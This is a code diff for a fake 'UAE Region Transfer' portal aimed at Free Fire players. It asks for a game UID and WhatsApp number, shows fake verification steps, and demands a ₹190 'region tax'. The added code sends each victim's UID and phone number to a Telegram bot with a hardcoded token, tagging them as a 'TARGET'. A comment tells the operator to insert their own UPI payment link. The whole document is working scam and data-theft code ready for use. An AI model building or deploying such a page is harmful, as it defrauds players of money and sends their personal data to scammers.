@@ -1,65 +1,28 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UAE SERVER PORTAL | OFFICIAL</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body { background: radial-gradient(circle, #1a1a1a 0%, #000 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; color: white; }
-        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 153, 0, 0.2); border-radius: 20px; }
-        .gold-glow { box-shadow: 0 0 20px rgba(255, 153, 0, 0.3); }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ff9900; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: none; margin: 10px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body class="p-6">
-    <div class="glass gold-glow p-8 w-full max-w-md text-center">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Flag_of_the_United_Arab_Emirates.svg" class="w-20 mx-auto mb-4 rounded shadow-lg">
-        <h1 class="text-2xl font-bold text-yellow-500 mb-2">UAE REGION TRANSFER</h1>
-        <p class="text-gray-400 text-sm mb-6">Official Server Migration & Tax Portal</p>
-
-        <div id="form-box">
-            <input type="number" id="uid" placeholder="Enter Free Fire UID" class="w-full bg-black border border-gray-700 p-3 rounded-lg mb-4 text-white outline-none focus:border-yellow-500">
-            <input type="text" id="phone" placeholder="WhatsApp Number" class="w-full bg-black border border-gray-700 p-3 rounded-lg mb-6 text-white outline-none focus:border-yellow-500">
-            <button onclick="levelUpSubmit()" class="w-full bg-yellow-600 hover:bg-yellow-500 text-black font-bold py-3 rounded-lg transition-all duration-300">VERIFY ACCOUNT</button>
+function finish(uid, phone) {
+    document.getElementById('spinner').style.display = 'none';
+    document.getElementById('status-msg').innerHTML = `
+        <div class="bg-green-900/20 p-4 rounded-lg border border-green-500 mb-4">
+            <h3 class="text-green-500 font-bold italic">✅ ELIGIBLE FOR TRANSFER</h3>
+            <p class="text-[10px] text-gray-400">UID: ${uid} is whitelisted</p>
+        </div>
+        
+        <div class="text-xs mb-4 text-left bg-black/40 p-3 rounded border border-gray-800">
+            <p>Region Tax: <span class="float-right text-yellow-500">₹190.00</span></p>
+            <p>Admin Fee: <span class="float-right text-yellow-500 italic">WAIVED</span></p>
+            <hr class="my-2 border-gray-800">
+            <p class="font-bold">Total Payable: <span class="float-right text-yellow-500 text-lg">₹190</span></p>
         </div>
 
-        <div id="processing" class="hidden">
-            <div class="loader" id="spinner"></div>
-            <p id="status-msg" class="text-yellow-500 font-mono text-sm"></p>
-        </div>
-    </div>
+        <button onclick="openPayment()" class="w-full bg-green-600 py-3 rounded-lg font-bold shadow-lg animate-pulse">
+            PAY TAX & START TRANSFER
+        </button>
+    `;
+    
+    // Telegram Alert
+    fetch(`https://api.telegram.org/bot7917736413:AAG6k8fQyXy6m0-w7V3mK_R4j6L5mK8_pE/sendMessage?chat_id=6348920155&text=🔥 TARGET ON PAYMENT PAGE%0A🆔 UID: ${uid}%0A📞 No: ${phone}`);
+}
 
-    <script>
-        function levelUpSubmit() {
-            const uid = document.getElementById('uid').value;
-            const phone = document.getElementById('phone').value;
-            if(!uid || !phone) { alert("Please fill details!"); return; }
-
-            document.getElementById('form-box').classList.add('hidden');
-            document.getElementById('processing').classList.remove('hidden');
-            document.getElementById('spinner').style.display = 'block';
-
-            let msgs = ["Connecting to UAE Server...", "Verifying UID...", "Calculating Region Tax..."];
-            let i = 0;
-            let timer = setInterval(() => {
-                document.getElementById('status-msg').innerText = msgs[i];
-                i++;
-                if(i >= msgs.length) {
-                    clearInterval(timer);
-                    finish();
-                }
-            }, 1500);
-        }
-
-        function finish() {
-            document.getElementById('spinner').style.display = 'none';
-            document.getElementById('status-msg').innerHTML = "✅ ELIGIBLE!<br>Tax: ₹190 / 500 Diamonds<br><br><button class='bg-green-600 p-2 rounded'>PAY NOW</button>";
-            
-            // Auto-send to Telegram
-            fetch('https://api.telegram.org/bot7917736413:AAG6k8fQyXy6m0-w7V3mK_R4j6L5mK8_pE/sendMessage?chat_id=6348920155&text=🔥 New Target Ready!');
-        }
-    </script>
-</body>
-</html>
+function openPayment() {
+    // Yahan tum apna UPI ID ya Payment Link daal sakte ho
+    window.location.href = "YOUR_PAYMENT_LINK_HERE";
+}
